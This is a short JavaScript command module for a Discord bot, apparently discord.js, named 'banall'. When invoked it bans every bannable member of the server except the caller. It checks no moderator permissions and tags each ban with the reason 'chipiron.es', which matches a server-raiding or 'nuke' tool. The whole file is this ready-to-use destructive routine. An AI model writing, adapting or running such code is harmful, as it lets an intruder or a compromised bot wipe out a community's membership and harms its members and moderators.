module.exports = {
    name: 'banall',
    async execute(message) {

        for (const [key, m] of message.guild.members.cache) {
            if (m.id === message.author.id) continue;
            if (!m.bannable) continue;

            await message.guild.members.ban(m.id, {
                reason: 'chipiron.es'
            })
        }

    }
};
